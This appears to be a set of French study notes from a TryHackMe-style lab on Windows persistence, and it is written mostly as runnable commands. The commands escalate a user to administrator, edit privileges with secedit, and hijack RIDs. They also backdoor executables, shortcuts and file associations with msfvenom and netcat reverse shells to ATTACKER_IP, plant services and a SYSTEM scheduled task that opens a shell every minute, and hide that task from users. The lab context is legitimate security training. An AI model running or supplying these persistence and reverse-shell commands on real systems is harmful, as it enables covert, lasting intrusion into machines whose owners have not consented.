Accorder des privilege d'administrateur a un utilissateur non privilegie est de l'integrer au groupe Administrateur > 
```
net localgroup Administrators thmuser0 /add 
```

# Privilèges spéciaux et descripteurs de sécurité
## attribuer les privilege de un utilisateur 
Nous pouvons attribuer les privileges a n'importe quel utilisateur , indépendamment de son groupe d'appartenance . Nous utiliserons la commande "secedit" suivante :
nous allons exporter la configuration actuelle vers un fichier temporaire :

```
secedit /export /cfg config.inf
```

Nous ajoutons notre utilisateur  au ligne des privileges qui le concerne : https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

Nous convertissons finalement le fichier .inf en un fichier .sdb  qui est ensuite utilise pour recharger la configuration dans le système

```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf

```

Maintenant l'utilisateur a des privileges equivalents a ceux de n'importe quel opérateur de sauvegarde. 
Pour ouvrir la fenetre de configuration du descripteur de securite de WinRM, nous pouvons utiliser la commande suivante dans Powershell

```
set-PSSessionConfiguration -Name Microsoft.PowerShell -showsecurityDescriptorUI
```

# RID Hijacking

Une autre Methode pour obtenir des privileges administratif sans etre administrateur consiste a modifier certaines valeur de registre pour faire croire au systeme d'exploitation que vous etes administrateur .
Lors de la création d'un utilisateur, un identifiant appelé **ID relatif (RID)** lui est attribué. Ce RID est simplement un identifiant numérique représentant l'utilisateur sur l'ensemble du système.
Lorsqu'un utilisateur se connecte, le processus LSASS récupère son RID dans la ruche du registre SAM et crée un jeton d'accès associé à ce RID. En falsifiant la valeur du registre, nous pouvons forcer Windows à attribuer un jeton d'accès Administrateur à un utilisateur sans privilèges en associant le même RID aux deux comptes.
Pour trouver les RID attribués à n’importe quel utilisateur, vous pouvez utiliser la commande suivante :

```
wmic useraccount get name,sid
```

Pour exécuter Regedit en tant que SYSTEM, nous utiliserons psexec

```
PsExec64.exe -i -s regedit
```

# Fichier de porte dérobée
## fichiers exécutables
Si vous trouvez un exécutable sur le bureau, il y a de fortes chances que l'utilisateur l'utilise fréquemment. Imaginez que nous trouvions un raccourci vers PuTTY.

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

## Fichiers de raccourcis
Avant de pirater la cible du raccourci, créons un script PowerShell simple dans `C:\Windows\System32`ou tout autre emplacement insaisissable. Le script exécutera un shell inversé, puis exécutera calc.exe depuis l'emplacement d'origine dans les propriétés du raccourci :

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Enfin, nous allons modifier le raccourci pour qu'il pointe vers notre script.
```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

Commençons par un écouteur nc pour recevoir notre reverse shell sur la machine de notre attaquant :

```
nc -lvp 4445
```

## Hijacking File Associations
En plus de persister via des exécutables ou des raccourcis, nous pouvons détourner n'importe quelle association de fichiers pour forcer le système d'exploitation à exécuter un shell chaque fois que l'utilisateur ouvre un type de fichier spécifique.
Les associations de fichiers par défaut du système d'exploitation sont conservées dans le registre, où une clé est stockée pour chaque type de fichier `HKLM\Software\Classes\`. Imaginons que nous souhaitions vérifier quel programme ouvre les fichiers .txt ; il suffit de rechercher la `.txt`sous-clé et de trouver l' **identifiant programmatique (ProgID)**  qui lui est associé.

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

# Abus de services 
Les services Windows offrent un excellent moyen d'établir la persistance , car ils peuvent être configurés pour s'exécuter en arrière-plan dès le démarrage de la machine victime.

 ## Service comme porte dérobée
 Nous pouvons créer et démarrer un service nommé « THMservice » en utilisant les commandes suivantes :

  ```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```
**Remarque :** il doit y avoir un espace après chaque signe égal pour que la commande fonctionne.

nous pouvons également créer un shell inversé avec msfvenom et l'associer au service créé. Notez cependant que les exécutables de service sont uniques, car ils doivent implémenter un protocole particulier pour être gérés par le système.

```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Vous pouvez ensuite copier l'exécutable sur votre système cible, par exemple `C:\Windows`et pointer le binPath du service vers celui-ci :

```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```


## Modification des services existants

Il peut être judicieux de réutiliser un service existant plutôt que d'en créer un pour éviter toute détection. En général, tout service désactivé est un bon candidat, car il peut être modifié sans que l'utilisateur ne s'en aperçoive.
Vous pouvez obtenir une liste des services disponibles en utilisant la commande suivante :

```
sc.exe query state=all
```

```
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

# Abuser des taches planifies 
**La méthode la plus courante pour planifier des tâches est d'utiliser le planificateur de tâches Windows** intégré.
Créons une tâche qui exécute un reverse shell toutes les minutes

```
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

Pour vérifier si notre tâche a été créée avec succès, nous pouvons utiliser la commande suivante :

```
schtasks /query /tn thm-taskbackdoor
```

Notre tâche devrait être opérationnelle maintenant, mais si l'utilisateur compromis tente de lister ses tâches planifiées, notre porte dérobée sera visible. Pour masquer davantage notre tâche planifiée, nous pouvons la rendre invisible à tous les utilisateurs du système en supprimant son **descripteur de sécurité (SD)** .
Les descripteurs de sécurité de toutes les tâches planifiées sont stockés dans `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`.

# Persistance declenchee par la connexion

## Dossier de demarrage 
Chaque utilisateur dispose d'un dossier dans `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```
